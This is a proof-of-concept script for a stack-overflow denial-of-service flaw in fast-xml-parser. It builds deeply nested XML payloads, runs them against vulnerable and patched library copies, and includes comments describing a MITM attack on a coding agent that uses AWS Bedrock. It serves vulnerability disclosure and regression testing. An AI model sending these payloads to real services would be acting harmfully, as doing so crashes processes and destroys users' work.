// POC 2: fast-xml-parser <= 5.3.3 RangeError DoS
// Advisory: GHSA-37qj-frw5-hhjh
// Impact: Crafted XML input triggers a RangeError that crashes the Node.js process.
// This is a transitive dependency via @aws-sdk/client-bedrock-runtime.
//
// ATTACK CHAIN:
// 1. @aws-sdk/client-bedrock-runtime uses fast-xml-parser to parse XML error
//    responses from the AWS Bedrock API.
// 2. An attacker who controls the network path (MITM via compromised proxy,
//    DNS poisoning, or a user-configured AWS_ENDPOINT_URL) can inject a
//    crafted XML response.
// 3. The malicious XML has deeply nested tags that cause the parser's
//    recursive descent to blow the call stack -> RangeError -> process crash.
//
// REAL-WORLD SCENARIO:
// - Corporate environment: Developer runs the coding agent behind a corporate
//   proxy. Attacker compromises the proxy and injects malicious XML into AWS
//   API responses. The agent crashes mid-session, losing unsaved work.
// - Custom endpoint: A user configures AWS_ENDPOINT_URL to point to a local
//   mock or dev Bedrock endpoint. The mock returns crafted XML, crashing the
//   agent process. In a CI/CD pipeline, this causes build failures.
// - Supply chain: If a dependency pulls from a compromised XML feed, the same
//   parser vulnerability can crash the process.
//
// SEVERITY: The impact is Denial of Service (process crash), not code
// execution. But in a long-running agent session, a crash means losing all
// in-progress work, conversation state, and potentially corrupting files
// that were mid-edit.

import { createRequire } from "module";
import { fork } from "child_process";
import { writeFileSync, unlinkSync } from "fs";

const RED = "\x1b[31m";
const GREEN = "\x1b[32m";
const YELLOW = "\x1b[33m";
const BOLD = "\x1b[1m";
const DIM = "\x1b[2m";
const RESET = "\x1b[0m";

// Generate deeply nested XML to trigger stack overflow in vulnerable parser
function generateMaliciousXml(depth) {
  let xml = '<?xml version="1.0"?>';
  for (let i = 0; i < depth; i++) {
    xml += `<n${i % 10}>`;
  }
  xml += "payload";
  for (let i = depth - 1; i >= 0; i--) {
    xml += `</n${i % 10}>`;
  }
  return xml;
}

// Generate XML with entity-like expansion patterns
function generateEntityExpansionXml() {
  // Create XML with attributes that trigger parsing edge cases
  let xml = '<?xml version="1.0"?><root>';
  for (let i = 0; i < 500; i++) {
    xml += `<item id="${i}" ${"a".repeat(100)}="${"b".repeat(100)}">`;
    xml += `<nested>${"x".repeat(200)}</nested>`;
    xml += "</item>";
  }
  xml += "</root>";
  return xml;
}

// Worker script that runs the parser in a child process (to catch crashes)
// Uses a temp file for XML input to avoid E2BIG with large payloads
function createWorkerScript(parserPath) {
  return `
import { XMLParser } from "${parserPath}";
import { readFileSync } from "fs";

const xmlFile = process.argv[2];
const xml = readFileSync(xmlFile, "utf8");
const parser = new XMLParser({
  ignoreAttributes: false,
  allowBooleanAttributes: true,
  parseAttributeValue: true,
  processEntities: true,
});

try {
  const result = parser.parse(xml);
  process.send({ status: "parsed", keys: Object.keys(result).length });
} catch (e) {
  process.send({ status: "error", errorType: e.constructor.name, message: e.message.substring(0, 200) });
}
`;
}

async function testParser(label, parserPath, xmlPayloads) {
  const results = [];

  for (const { name, xml } of xmlPayloads) {
    const workerFile = `/tmp/xml-worker-${Date.now()}.mjs`;
    const xmlFile = `/tmp/xml-payload-${Date.now()}.xml`;
    writeFileSync(workerFile, createWorkerScript(parserPath));
    writeFileSync(xmlFile, xml);

    const result = await new Promise((resolve) => {
      const timeout = setTimeout(() => {
        child.kill("SIGKILL");
        resolve({ name, status: "timeout", message: "Process killed after 10s" });
      }, 10_000);

      const child = fork(workerFile, [xmlFile], {
        stdio: ["pipe", "pipe", "pipe", "ipc"],
        execArgv: ["--stack-size=1024"],
      });

      let stderr = "";
      child.stderr.on("data", (d) => (stderr += d.toString()));

      child.on("message", (msg) => {
        clearTimeout(timeout);
        resolve({ name, ...msg });
      });

      child.on("exit", (code, signal) => {
        clearTimeout(timeout);
        if (signal === "SIGKILL") return; // already resolved by timeout
        if (code !== 0) {
          resolve({
            name,
            status: "crash",
            message: stderr.trim().split("\n")[0] || `exit code ${code}, signal ${signal}`,
          });
        }
      });

      child.on("error", (err) => {
        clearTimeout(timeout);
        resolve({ name, status: "error", message: err.message });
      });
    });

    try { unlinkSync(workerFile); } catch {}
    try { unlinkSync(xmlFile); } catch {}
    results.push(result);
  }

  return results;
}

// --- Main ---
console.log(`\n${BOLD}=== POC 2: fast-xml-parser RangeError DoS ===${RESET}`);
console.log(`${YELLOW}Advisory: GHSA-37qj-frw5-hhjh${RESET}`);
console.log(`${YELLOW}Dep chain: @aws-sdk/client-bedrock-runtime -> @smithy/* -> fast-xml-parser${RESET}`);
console.log(`${YELLOW}Attack vector: Malicious XML in AWS API response (MITM, custom endpoint)${RESET}`);
console.log(`${YELLOW}Impact: Process crash — agent session lost, files mid-edit may corrupt${RESET}\n`);

console.log(`${DIM}  Real-world attack chain:${RESET}`);
console.log(`${DIM}  1. Agent makes Bedrock API call (packages/ai/src/providers/)${RESET}`);
console.log(`${DIM}  2. Attacker intercepts response (proxy MITM, DNS poisoning, or custom endpoint)${RESET}`);
console.log(`${DIM}  3. Crafted XML response has 10,000+ nested tags${RESET}`);
console.log(`${DIM}  4. fast-xml-parser's recursive descent blows the call stack${RESET}`);
console.log(`${DIM}  5. RangeError crashes the entire Node.js process${RESET}`);
console.log(`${DIM}  6. Agent session lost, in-progress file edits potentially corrupted${RESET}\n`);

const payloads = [
  { name: "Deeply nested XML (5000 levels)", xml: generateMaliciousXml(5000) },
  { name: "Deeply nested XML (10000 levels)", xml: generateMaliciousXml(10000) },
  { name: "Large attribute expansion", xml: generateEntityExpansionXml() },
];

let exitCode = 0;

// Test vulnerable version
console.log(`${BOLD}--- Vulnerable version (fast-xml-parser 5.2.5) ---${RESET}`);
const vulnResults = await testParser(
  "Vulnerable",
  "/app/vulnerable/node_modules/fast-xml-parser/src/fxp.js",
  payloads,
);

for (const r of vulnResults) {
  if (r.status === "crash" || r.status === "timeout") {
    console.log(`  ${RED}[VULNERABLE]${RESET} ${r.name}: ${r.status} - ${r.message}`);
    exitCode = 1;
  } else if (r.status === "error" && r.errorType === "RangeError") {
    console.log(`  ${RED}[VULNERABLE]${RESET} ${r.name}: RangeError thrown - ${r.message}`);
    exitCode = 1;
  } else if (r.status === "error") {
    console.log(`  ${YELLOW}[ERROR]${RESET} ${r.name}: ${r.errorType} - ${r.message}`);
  } else {
    console.log(`  ${YELLOW}[HANDLED]${RESET} ${r.name}: parsed successfully (${r.keys} top-level keys)`);
  }
}

// Test patched version
console.log(`\n${BOLD}--- Patched version (fast-xml-parser 5.3.4) ---${RESET}`);
const patchedResults = await testParser(
  "Patched",
  "/app/patched/node_modules/fast-xml-parser/src/fxp.js",
  payloads,
);

for (const r of patchedResults) {
  if (r.status === "crash" || r.status === "timeout") {
    console.log(`  ${RED}[STILL VULNERABLE]${RESET} ${r.name}: ${r.status} - ${r.message}`);
  } else if (r.status === "error") {
    console.log(`  ${GREEN}[PATCHED]${RESET} ${r.name}: controlled error - ${r.message}`);
  } else {
    console.log(`  ${GREEN}[PATCHED]${RESET} ${r.name}: handled gracefully (${r.keys} top-level keys)`);
  }
}

console.log();
process.exit(exitCode);
